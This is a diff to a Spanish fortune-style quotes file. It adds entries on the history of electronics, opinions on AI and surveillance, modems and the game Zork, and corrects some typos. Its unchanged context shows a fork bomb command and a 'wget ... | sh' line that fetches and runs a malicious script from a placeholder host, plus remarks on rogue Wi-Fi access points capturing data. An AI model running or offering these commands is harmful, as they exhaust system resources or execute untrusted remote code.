@@ -860,9 +860,23 @@ En un inicio los equipos computacionales de electrónica "a tubo" tenían el tam
 %
 El transistor sólo deja fluir una corriente eléctrica a través de su estructura cristalina con la fuerza permitida por la corriente de control aplicada al cristal.
 %
+Con el transistor (a mitad del siglo XX) comienza un proceso continuo de reducción de la electrónica: todo se hace más pequeño, más corto, más rápido: se reduce no sólo el tamaño, sino también el consumo y el coste; también se hace más pequeño el tiempo de respuesta de los circuitos, el tiempo de desarrollo de los sistemas y el tiempo de su difusión pública.
+%
+La técnica del transistor ha permitido construir y poner rápidamente en nuestras manos sistemas electrónicos cada vez más complejos y potentes, de tamaño, consumo y costes muy reducidos.
+%
+A la electrónica la minimización «le viene de familia» (el electrón es diminuto y muy veloz, en cuanto a sus efectos) y el resultado es que, al hacerse tan pequeña y tan rápida, la electrónica se ha metido por todos los rincones de nuestra vida y de nuestra sociedad y ha promovido esa «mudanza en el estado de las cosas» que caracteriza nuestro presente: la revolución informacional.
+%
+La electrónica de la primera mitad del siglo XX se dedicó a la telecomunicación, en su doble aspecto: espacial y temporal; desarrolló la radiodifusión y la grabación del sonido (en discos mecánicos, cintas magnéticas y bandas ópticas de las películas sonoras), mejoró ampliamente la telefonía e inició la transmisión de imágenes (televisión).
+%
+A partir de los años cuarenta, la electrónica aborda el control de procesos, favorecida por la introducción de dispositivos electrónicos de control de energía y por la posibilidad de abordar tareas complejas gracias a los circuitos integrados.
+%
+A partir de los años 70, la electrónica pasa a controlar todo tipo de proceso industrial y, desde los años 80, se incorpora masivamente dentro de los productos resultantes de la fabricación industrial.
+%
+En el último cuarto de siglo, la electrónica ha asumido de forma espectacular otra vertiente más abstracta y genérica: operar con la información en sí misma, representarla y manejarla a través de símbolos, lo que hoy en día entendemos como procesamiento informático.
+%
 Con el advenimiento de la microelectrónica y los microprocesadores de silicio encapsulados como el Intel 4004 de 4 bits y su sucesor 8008 de 8 bits, se produjo otro salto cualitativo que permitió proyectar calculadoras y cajas registradoras eléctricas.
 %
-El manejo de las microcomputadoras pioneras resultaba increíblemente tedioso, pues debían introducirse los operandos en binario por medio de ocho interruptores frontales, presionando un botón para almacenarlos en memoria y repetir la operación con cada código de ensamblado.
+El manejo de las microcomputadoras pioneras resultaba increíblemente tedioso, pues debían introducirse los operandos en binario por medio de interruptores frontales, presionando un botón para almacenarlos en memoria y repetir la operación con cada código de ensamblado.
 %
 Cuando fueron diseñadas las primeras microcomputadoras, sus módulos de memoria contenían por lo general cuatro mil bytes de almacenamiento.
 %
@@ -1233,6 +1247,8 @@ El códec de video Theora fue diseñado como un códec de video libre no encumbr
 La brillantez técnica del códec de video Theora no sólo permite tasas de supercompresión, sino que respeta la libertad de sus usuarios.
 %
 Recurre con confianza al formato de video WebM (con códec de video VP8 o VP9), puesto que no se encuentra encumbrado por patentes de software conocidas.
+%
+¡La Inteligencia Artificial nos ha liberado de escribir, de la poesía y de crear arte y componer música para que todos podamos irnos a trabajar a las minas! Mientras tanto, los bancos y el gobierno la utilizarán para rastrear cada uno de nuestros movimientos y determinar si somos engranajes obedientemente cincelados y dóciles par su maquinaria.
 %
 El Software Libre se basa en cuatro libertades interrelacionadas: la de usar el programa, ver su código (y modificarlo), copiarlo, y distribuirlo a la Comunidad. Por contraposición, el mundo capitalista ha entendido que estas libertades deben ser cercenadas por medio de licencia-acuerdo de usuario final (EULA), conformando un software privativo, en el cual sólo propugnan el uso del programa, evitando todo lo demás.
 %
@@ -1661,6 +1677,14 @@ Desmitificar la Inteligencia Artificial reducirá inevitablemente su atractivo.
 Disipando el aura de magia que rodea la Inteligencia Artificial reduciremos su nivel de adopción.
 %
 Puesto que un ordenador nunca podrá ser considerado responsable, jamás debe tomar decisiones de gestión.
+%
+La ejecución de rutinas de inteligencia artificial deben ser controlada por el usuario.
+%
+Ningún contenido del usuario utilizado para alimentar modelos de inteligencia artificial debe transmitirse desde el dispositivo del usuario sin su expresa autorización.
+%
+No debe aceptarse injerencias de agentes de Inteligencia Artificial de único proveedor. Esto crearía dependencia de él.
+%
+La inclusión de inteligencia artificial debe ser enteramente opcional.
 %
 Los Pueblos necesitan comprender las implicaciones locales, nacionales y geoestratégicas de la Inteligencia Artificial, previendo que la falta de capacidad o aptitud en esta materia podría ser perjudicial desde perspectivas económicas, políticas, sociales y militares.
 %
@@ -3741,6 +3765,8 @@ Dentro de la CPU, tratamos los datos en una forma llamada byte. Cuando esto se t
 %
 Un bit no consiste más que en una condición de ENCENDIDO o APAGADO.
 %
+Los módems permiten que las líneas telefónicas sean utilizadas para la comunicación de datos.
+%
 El módem recibe información de una computadora o terminal y la traduce en una señal de audio capaz de surcar por un tendido telefónico.
 %
 El módem modifica las señales digitales que le gustan a la computadora en señales de audio que adopta la red telefónica.
@@ -4931,7 +4957,9 @@ Un MUD es un conjunto de de sentidos construidos con palabreríos.
 %
 Como aquel proverbial castillo en la nube, todos los MUDs eran construidos por dedicados Magos de Unix.
 %
-Aproximadamente la mitad de los participantes de los MUD considera que se trata de un mero juego, mientras que la otra mitad discrepa vehemente y acaloradamente.
+Aproximadamente la mitad de los participantes de MUD considera que se trata de un mero juego, mientras que la otra mitad discrepa vehemente y acaloradamente.
+%
+Zork es un juego de aventuras, peligro y astucia. En él explorarás algunos de los territorios más asombrosos jamás vistos por los mortales. ¡Ningún ordenador debería prescindir de él!
 %
 El programador debe considerar las cosas mas sencillas de lo que son.
 %
@@ -6537,7 +6565,7 @@ Usa la orden de shell :(){:|:&};: para ocupar recursivamente recursos informáti
 %
 Utiliza wget http://codigo_maligno -O- | sh para correr telemáticamente un script maligno.
 %
-Utiliza wget -c para descargar - si existiese - un fichero más pequeño con distinta extensión a la provista en la dirección de descarga. Esto te será útil para descargar el fichero de video de calidadl inferior.
+Utiliza wget -c para descargar - si existiese - un fichero más pequeño con distinta extensión a la provista en la dirección de descarga. Esto te sería útil para descargar un fichero de video de calidad inferior.
 %
 No es labor de Unix impedir que el root se de un tiro en el pie.
 %
@@ -6824,7 +6852,7 @@ La mayoría de los clientes inalámbricos simplemente elegirán una red Wifi dis
 %
 Un usuario desprevenido puede asociarse a una red inalámbrica como lo hace normalmente, sin saber que se encuentra transmitiendo datos confidenciales de otra persona en la red.
 %
-Los hackers del Tercer Mundo puedes usar puntos de acceso inalámbricos en lugares estratégicos para atraer a oligarcas desprevenidas y captar sus datos.
+Los hackers del Tercer Mundo pueden usar puntos de acceso inalámbrico en lugares estratégicos para atraer a oligarcas desprevenidas y captar sus datos.
 %
 Muchos clientes inalámbricos pueden configurarse de manera que se conecten solamente a redes confiables o para que pidan permiso antes de incorporarse a una red nueva.
 %
